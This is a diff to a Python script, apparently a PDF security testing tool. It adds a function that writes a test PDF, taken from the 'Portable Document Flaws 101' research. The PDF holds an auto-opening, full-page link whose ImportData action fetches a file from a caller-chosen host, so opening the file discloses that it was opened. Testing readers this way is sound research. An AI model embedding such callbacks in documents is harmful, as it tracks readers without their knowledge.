@@ -14,6 +14,86 @@
 import io
 import sys
 
+## Testcase from 01-testsuite/02-disclosure/01-url-invocation/data-link.pdf
+## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
+def create_malpdf9(filename, host):
+    with io.FileIO(filename, "w") as file:
+        file.write('''
+%PDF-1.7
+
+1 0 obj
+  << /Type /Catalog
+     /Pages 2 0 R
+     /AcroForm << /Fields [<< /Type /Annot /Subtype /Widget /FT /Tx /T (a) /V (b) /Ff 0 >>] >>
+  >>
+endobj
+
+2 0 obj
+  << /Type /Pages
+     /Kids [3 0 R]
+     /Count 1
+     /MediaBox [0 0 595 842]
+  >>
+endobj
+
+3 0 obj
+  << /Type /Page
+     /Parent 2 0 R
+     /Resources
+      << /Font
+          << /F1
+              << /Type /Font
+                 /Subtype /Type1
+                 /BaseFont /Courier
+              >>
+          >>
+      >>
+     /Annots [<< /Type /Annot
+                 /Subtype /Link
+                 /Open true
+                 /A 5 0 R
+                 /H /N
+                 /Rect [0 0 595 842]
+              >>]
+     /Contents [4 0 R]
+  >>
+endobj
+
+4 0 obj
+  << /Length 67 >>
+stream
+  BT
+    /F1 22 Tf
+    30 800 Td
+    (Testcase: 'data'    ) Tj
+  ET
+endstream
+endobj
+
+5 0 obj
+  << /Type /Action
+     /S /ImportData
+     /F << /Type /FileSpec /F ('''+host+'''/test9.pdf) /V true /FS /URL >>
+  >>
+endobj
+
+xref
+0 6
+0000000000 65535 f
+0000000010 00000 n
+0000000164 00000 n
+0000000265 00000 n
+0000000724 00000 n
+0000000844 00000 n
+trailer
+  << /Root 1 0 R
+     /Size 6
+  >>
+startxref
+997
+%%EOF
+''')
+
 ## Testcase from ./02-exploits/15-masterpdf-editor/02-disclosure-01-url-invocation.pdf
 ## https://github.com/RUB-NDS/PDF101 "Portable Document Flaws 101" at Black Hat USA 2020
 def create_malpdf8(filename, host):
@@ -539,5 +619,6 @@ if __name__ == "__main__":
   create_malpdf6("test7.pdf", 'https://' + host)
   create_malpdf7("test8.pdf", 'https://' + host)
   create_malpdf8("test9.pdf", 'https://' + host)
+  create_malpdf9("test10.pdf", 'https://' + host)
 
   print("Done.")
